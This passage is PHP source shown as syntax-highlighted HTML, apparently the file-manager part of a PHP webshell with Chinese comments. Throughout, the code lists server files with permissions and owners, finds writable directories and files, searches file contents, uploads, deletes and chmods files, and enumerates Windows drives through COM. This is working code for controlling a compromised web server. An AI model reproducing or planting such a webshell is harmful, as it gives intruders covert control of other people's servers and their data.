</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            m(&#39;Deleted folder/file have finished,choose &#39; . count($dl) . &#39; success &#39; . $succ . &#39; fail &#39; . $fail);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            m(&#39;Please select folder/file(s)&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    //操作完毕
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formhead(array(&#39;name&#39; =&gt; &#39;createdir&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;newdirname&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;dir&#39;, $nowpath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formfoot();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formhead(array(&#39;name&#39; =&gt; &#39;fileperm&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;newperm&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;pfile&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;dir&#39;, $nowpath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formfoot();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formhead(array(&#39;name&#39; =&gt; &#39;copyfile&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;sname&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;tofile&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;dir&#39;, $nowpath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formfoot();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formhead(array(&#39;name&#39; =&gt; &#39;rename&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;oldname&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;newfilename&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;dir&#39;, $nowpath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formfoot();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formhead(array(&#39;name&#39; =&gt; &#39;fileopform&#39;, &#39;target&#39; =&gt; &#39;_blank&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;action&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;opfile&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;dir&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formfoot();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formhead(array(&#39;name&#39; =&gt; &#39;getsize&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;getdir&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    makehide(&#39;dir&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    formfoot();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $free = @disk_free_space($nowpath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    !$free &amp;&amp; $free = 0;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $all = @disk_total_space($nowpath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    !$all &amp;&amp; $all = 0;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $used = $all - $free;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    p(&#39;&lt;h2&gt;File Manager - Current disk free &#39; . sizecount($free) . &#39; of &#39; . sizecount($all) . &#39; (&#39; . @round(100 / ($all / $free), 2) . &#39;%)&lt;/h2&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $cwd_links = &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $path = explode(&#39;/&#39;, $nowpath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $n = count($path);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    for ($i = 0; $i &lt; $n - 1; $i++) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $cwd_links .= &#39;&lt;a href=&#34;javascript:godir(\&#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        for ($j = 0; $j &lt;= $i; $j++) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $cwd_links .= $path[$j] . &#39;/&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $cwd_links .= &#39;\&#39;);&#34;&gt;&#39; . $path[$i] . &#39;/&lt;/a&gt;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    ?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        &lt;script type=&#34;text/javascript&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            document.onclick = shownav;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            function shownav(e) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                var src = e ? e.target : event.srcElement;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                do {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    if (src.id == &#34;jumpto&#34;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        $(&#39;inputnav&#39;).style.display = &#34;&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        $(&#39;pathnav&#39;).style.display = &#34;none&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        //hidenav();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        return;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    if (src.id == &#34;inputnav&#34;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        return;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    src = src.parentNode;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                } while (src.parentNode)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $(&#39;inputnav&#39;).style.display = &#34;none&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $(&#39;pathnav&#39;).style.display = &#34;&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        &lt;/script&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        &lt;div style=&#34;background:#eee;margin-bottom:10px;&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            &lt;table id=&#34;pathnav&#34; width=&#34;100%&#34; border=&#34;0&#34; cellpadding=&#34;5&#34; cellspacing=&#34;0&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                &lt;tr&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    &lt;td width=&#34;100%&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        &lt;?php echo $cwd_links . &#39; - &#39; . getChmod($nowpath) . &#39; / &#39; . getPerms($nowpath) . getUser($nowpath); ?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        (
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        &lt;?php echo $dir_writeable; ?&gt;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    &lt;/td&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    &lt;td nowrap&gt;&lt;input class=&#34;bt&#34; id=&#34;jumpto&#34; name=&#34;jumpto&#34; value=&#34;Jump to&#34; type=&#34;button&#34;&gt;&lt;/td&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                &lt;/tr&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            &lt;/table&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            &lt;table id=&#34;inputnav&#34; width=&#34;100%&#34; border=&#34;0&#34; cellpadding=&#34;5&#34; cellspacing=&#34;0&#34; style=&#34;display:none;&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                &lt;form action=&#34;&#34; method=&#34;post&#34; id=&#34;godir&#34; name=&#34;godir&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    &lt;tr&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        &lt;td nowrap&gt;Current Directory (
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                            &lt;?php echo $dir_writeable; ?&gt;,
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                            &lt;?php echo getChmod($nowpath); ?&gt;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        &lt;/td&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        &lt;td width=&#34;100%&#34;&gt;&lt;input name=&#34;view_writable&#34; value=&#34;0&#34; type=&#34;hidden&#34; /&gt;&lt;input
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                class=&#34;input&#34; name=&#34;dir&#34; value=&#34;&lt;?php echo $nowpath; ?&gt;&#34; type=&#34;text&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                style=&#34;width:99%;margin:0 8px;&#34;&gt;&lt;/td&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        &lt;td nowrap&gt;&lt;input class=&#34;bt&#34; value=&#34;GO&#34; type=&#34;submit&#34;&gt;&lt;/td&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    &lt;/tr&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                &lt;/form&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            &lt;/table&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            &lt;?php
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            if (IS_WIN &amp;&amp; IS_COM) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $obj = new COM(&#39;scripting.filesystemobject&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                if ($obj &amp;&amp; is_object($obj) &amp;&amp; $obj-&gt;Drives) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    echo &#39;&lt;div class=&#34;drives&#34;&gt;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $DriveTypeDB = array(0 =&gt; &#39;Unknow&#39;, 1 =&gt; &#39;Removable&#39;, 2 =&gt; &#39;Fixed&#39;, 3 =&gt; &#39;Network&#39;, 4 =&gt; &#39;CDRom&#39;, 5 =&gt; &#39;RAM Disk&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $comma = &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    foreach ($obj-&gt;Drives as $drive) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        if ($drive-&gt;Path) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                            p($comma . &#39;&lt;a href=&#34;javascript:godir(\&#39;&#39; . $drive-&gt;Path . &#39;/\&#39;);&#34;&gt;&#39; . $DriveTypeDB[$drive-&gt;DriveType] . &#39;(&#39; . $drive-&gt;Path . &#39;)&lt;/a&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                            $comma = &#39;&lt;span&gt;|&lt;/span&gt;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    echo &#39;&lt;/div&gt;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            ?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        &lt;?php
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $findstr = $_POST[&#39;findstr&#39;];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $re = $_POST[&#39;re&#39;];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        tbhead();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;tr class=&#34;alt1&#34;&gt;&lt;td colspan=&#34;7&#34; style=&#34;padding:5px;line-height:20px;&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;form action=&#34;&#39; . $self . &#39;&#34; method=&#34;POST&#34; enctype=&#34;multipart/form-data&#34;&gt;&lt;div style=&#34;float:right;&#34;&gt;&lt;input class=&#34;input&#34; name=&#34;uploadfile&#34; value=&#34;&#34; type=&#34;file&#34; /&gt; &lt;input class=&#34;bt&#34; name=&#34;doupfile&#34; value=&#34;Upload&#34; type=&#34;submit&#34; /&gt;&lt;input name=&#34;uploaddir&#34; value=&#34;&#39; . $nowpath . &#39;&#34; type=&#34;hidden&#34; /&gt;&lt;input name=&#34;dir&#34; value=&#34;&#39; . $nowpath . &#39;&#34; type=&#34;hidden&#34; /&gt;&lt;/div&gt;&lt;/form&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;a href=&#34;javascript:godir(\&#39;&#39; . $_SERVER[&#34;DOCUMENT_ROOT&#34;] . &#39;\&#39;);&#34;&gt;WebRoot&lt;/a&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39; | &lt;a href=&#34;javascript:godir(\&#39;.\&#39;);&#34;&gt;ScriptPath&lt;/a&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39; | &lt;a href=&#34;javascript:godir(\&#39;&#39; . $nowpath . &#39;\&#39;);&#34;&gt;View All&lt;/a&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39; | View Writable ( &lt;a href=&#34;javascript:godir(\&#39;&#39; . $nowpath . &#39;\&#39;,\&#39;dir\&#39;);&#34;&gt;Directory&lt;/a&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39; | &lt;a href=&#34;javascript:godir(\&#39;&#39; . $nowpath . &#39;\&#39;,\&#39;file\&#39;);&#34;&gt;File&lt;/a&gt; )&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39; | &lt;a href=&#34;javascript:createdir();&#34;&gt;Create Directory&lt;/a&gt; | &lt;a href=&#34;javascript:createfile(\&#39;&#39; . $nowpath . &#39;\&#39;);&#34;&gt;Create File&lt;/a&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;div style=&#34;padding:5px 0;&#34;&gt;&lt;form action=&#34;&#39; . $self . &#39;&#34; method=&#34;POST&#34;&gt;Find string in files(current folder): &lt;input class=&#34;input&#34; name=&#34;findstr&#34; value=&#34;&#39; . $findstr . &#39;&#34; type=&#34;text&#34; /&gt; &lt;input class=&#34;bt&#34; value=&#34;Find&#34; type=&#34;submit&#34; /&gt; Type: &lt;input class=&#34;input&#34; name=&#34;writabledb&#34; value=&#34;&#39; . $writabledb . &#39;&#34; type=&#34;text&#34; /&gt;&lt;input name=&#34;dir&#34; value=&#34;&#39; . $dir . &#39;&#34; type=&#34;hidden&#34; /&gt; &lt;input name=&#34;re&#34; value=&#34;1&#34; type=&#34;checkbox&#34; &#39; . ($re ? &#39;checked&#39; : &#39;&#39;) . &#39; /&gt; Regular expressions&lt;/form&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;tr class=&#34;head&#34;&gt;&lt;td&gt; &lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width=&#34;16%&#34;&gt;Last modified&lt;/td&gt;&lt;td width=&#34;10%&#34;&gt;Size&lt;/td&gt;&lt;td width=&#34;20%&#34;&gt;Chmod / Perms&lt;/td&gt;&lt;td width=&#34;22%&#34;&gt;Action&lt;/td&gt;&lt;/tr&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        //查看所有可写文件和目录
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $dirdata = array();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $filedata = array();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        if ($view_writable == &#39;dir&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $dirdata = GetWDirList($nowpath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $filedata = array();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        } elseif ($view_writable == &#39;file&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $dirdata = array();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $filedata = GetWFileList($nowpath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        } elseif ($findstr) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $dirdata = array();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $filedata = GetSFileList($nowpath, $findstr, $re);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            // 目录列表
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            //scandir()效率更高
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            $dirs = @opendir($dir);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            while ($file = @readdir($dirs)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $filepath = $nowpath . $file;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                if (@is_dir($filepath)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $dirdb[&#39;filename&#39;] = $file;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $dirdb[&#39;mtime&#39;] = @date(&#39;Y-m-d H:i:s&#39;, filemtime($filepath));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $dirdb[&#39;dirchmod&#39;] = getChmod($filepath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $dirdb[&#39;dirperm&#39;] = getPerms($filepath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $dirdb[&#39;fileowner&#39;] = getUser($filepath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $dirdb[&#39;dirlink&#39;] = $nowpath;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $dirdb[&#39;server_link&#39;] = $filepath;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $dirdata[] = $dirdb;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $filedb[&#39;filename&#39;] = $file;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $filedb[&#39;size&#39;] = sizecount(@filesize($filepath));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $filedb[&#39;mtime&#39;] = @date(&#39;Y-m-d H:i:s&#39;, filemtime($filepath));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $filedb[&#39;filechmod&#39;] = getChmod($filepath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $filedb[&#39;fileperm&#39;] = getPerms($filepath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $filedb[&#39;fileowner&#39;] = getUser($filepath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $filedb[&#39;dirlink&#39;] = $nowpath;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $filedb[&#39;server_link&#39;] = $filepath;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $filedata[] = $filedb;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            } // while
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            unset($dirdb);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            unset($filedb);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            @closedir($dirs);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        @sort($dirdata);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        @sort($filedata);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        $dir_i = &#39;0&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        p(&#39;&lt;form id=&#34;filelist&#34; name=&#34;filelist&#34; action=&#34;&#39; . $self . &#39;&#34; method=&#34;post&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makehide(&#39;action&#39;, &#39;file&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makehide(&#39;thefile&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makehide(&#39;doing&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        makehide(&#39;dir&#39;, $nowpath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        foreach ($dirdata as $key =&gt; $dirdb) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            if ($dirdb[&#39;filename&#39;] != &#39;..&#39; &amp;&amp; $dirdb[&#39;filename&#39;] != &#39;.&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                if ($getdir &amp;&amp; $getdir == $dirdb[&#39;server_link&#39;]) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $attachsize = dirsize($dirdb[&#39;server_link&#39;]);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $attachsize = is_numeric($attachsize) ? sizecount($attachsize) : &#39;Unknown&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $attachsize = &#39;&lt;a href=&#34;javascript:getsize(\&#39;&#39; . $dirdb[&#39;server_link&#39;] . &#39;\&#39;,\&#39;&#39; . $dir . &#39;\&#39;);&#34;&gt;Stat&lt;/a&gt;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $thisbg = bg();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;tr class=&#34;&#39; . $thisbg . &#39;&#34; onmouseover=&#34;this.className=\&#39;focus\&#39;;&#34; onmouseout=&#34;this.className=\&#39;&#39; . $thisbg . &#39;\&#39;;&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td width=&#34;2%&#34; nowrap&gt;&lt;input name=&#34;dl[]&#34; type=&#34;checkbox&#34; value=&#34;&#39; . $dirdb[&#39;server_link&#39;] . &#39;&#34;&gt;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td&gt;&lt;a href=&#34;javascript:godir(\&#39;&#39; . $dirdb[&#39;server_link&#39;] . &#39;\&#39;);&#34;&gt;&#39; . $dirdb[&#39;filename&#39;] . &#39;&lt;/a&gt;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td nowrap&gt;&lt;a href=&#34;javascript:opfile(\&#39;newtime\&#39;,\&#39;&#39; . $dirdb[&#39;server_link&#39;] . &#39;\&#39;,\&#39;&#39; . $dirdb[&#39;dirlink&#39;] . &#39;\&#39;);&#34;&gt;&#39; . $dirdb[&#39;mtime&#39;] . &#39;&lt;/a&gt;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td nowrap&gt;&#39; . $attachsize . &#39;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td nowrap&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;a href=&#34;javascript:fileperm(\&#39;&#39; . $dirdb[&#39;server_link&#39;] . &#39;\&#39;);&#34;&gt;&#39; . $dirdb[&#39;dirchmod&#39;] . &#39;&lt;/a&gt; / &#39;);
